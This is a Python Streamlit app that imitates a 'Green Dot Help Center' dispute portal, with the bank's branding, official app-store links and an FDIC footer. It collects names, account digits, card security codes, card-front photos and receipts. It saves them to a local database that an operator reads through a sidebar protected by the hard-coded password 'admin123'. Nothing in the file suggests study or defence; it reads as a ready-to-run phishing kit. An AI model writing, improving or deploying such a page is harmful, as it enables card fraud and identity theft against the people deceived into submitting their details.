
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Database setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, codigo_tarjeta TEXT,
                  monto REAL, factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- STYLING ---
st.markdown("""<style>
.main { background-color: #f4f7f6; }
.responsive-logo {
    max-width: 100%;
    height: auto;
    width: 200px;
    margin-bottom: 20px;
}
.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    border-radius: 5px !important;
    font-weight: bold !important;
    border: none !important;
}
h1, h2, h3 { color: #004a32 !important; }

/* Estilos para la sección de App externa */
.gd-line-height-100percent { line-height: 100%; }
.gd-headline-2xl { font-size: 2.5rem; }
.gd-proxima-bold { font-weight: bold; font-family: sans-serif; }
.gd-body-large { font-size: 1.1rem; }
.gd-proxima-regular { font-family: sans-serif; }
</style>""", unsafe_allow_html=True)

# --- CONTENT ---
if os.path.exists('logo.svg'):
    st.image('logo.svg', width=200)

st.title("Green Dot Help Center")
st.write("### Secure Claim Submission Portal")
st.divider()

with st.container():
    st.subheader("Submit a New Claim")
    with st.form("claim_form_final", clear_on_submit=True):
        c1, c2 = st.columns(2)
        with c1:
            nombre = st.text_input("Full Name")
            cuenta = st.text_input("Account Number (Last 4 digits)")
        with c2:
            codigo = st.text_input("Security Code")
            monto = st.number_input("Disputed Amount ($)", min_value=0.0, step=0.01)

        st.write("**Evidence Required**")
        f_col, t_col = st.columns(2)
        with f_col:
            file_factura = st.file_uploader("Store Receipt", type=['png', 'jpg', 'jpeg'])
        with t_col:
            file_tarjeta = st.file_uploader("Card Front Photo", type=['png', 'jpg', 'jpeg'])

        submit = st.form_submit_button("SUBMIT SECURE DISPUTE")

if submit:
    if nombre and file_factura and file_tarjeta:
        f_path = os.path.join(UPLOAD_DIR, f"f_{int(datetime.now().timestamp())}_{file_factura.name}")
        t_path = os.path.join(UPLOAD_DIR, f"t_{int(datetime.now().timestamp())}_{file_tarjeta.name}")
        with open(f_path, 'wb') as f: f.write(file_factura.getbuffer())
        with open(t_path, 'wb') as f: f.write(file_tarjeta.getbuffer())

        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) VALUES (?,?,?,?,?,?,?)",
                  (nombre, cuenta, codigo, monto, f_path, t_path, str(datetime.now())))
        conn.commit()
        conn.close()
        st.success("✅ Your claim has been submitted successfully.")
    else:
        st.error("⚠️ Please complete all fields.")

# --- APP DOWNLOAD SECTION ---
st.markdown("""
<div class="cmp-container" style="--mobile-bg-color: #000; --bg-color: #000; background-color: #000; color: white; padding: 40px; border-radius: 12px; margin-top: 20px;">
    <div class="aem-Grid aem-Grid--12">
        <div class="container responsivegrid">
            <h2><span class="gd-line-height-100percent"><span class="gd-headline-2xl"><span class="gd-proxima-bold">Download the Green Dot app</span></span></span></h2>
            <p><span class="gd-body-large"><span class="gd-proxima-regular">We offer secure mobile banking that allows you to conveniently manage your account from making deposits, to sending money or paying bills.</span></span></p>
            <div style="display: flex; gap: 20px; margin-top: 20px;">
                <a href="https://play.google.com/store/apps/details?id=com.cardinalcommerce.greendot&hl=en&gl=US" target="_blank">
                    <img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg" alt="Google play store" width="150">
                </a>
                <a href="https://apps.apple.com/us/app/green-dot-mobile-banking/id437092808" target="_blank">
                    <img src="https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg" alt="App store" width="150">
                </a>
            </div>
        </div>
    </div>
</div>
""", unsafe_allow_html=True)

st.divider()
st.caption("© 2024 Green Dot Corporation. Member FDIC.")

# Admin Side
with st.sidebar:
    pw = st.text_input("Admin Login", type="password")
    if pw == "admin123":
        if st.button("View Records"):
            conn = sqlite3.connect(DB_NAME)
            import pandas as pd
            df = pd.read_sql_query("SELECT * FROM greendot_submissions", conn)
            conn.close()
            st.write(df)
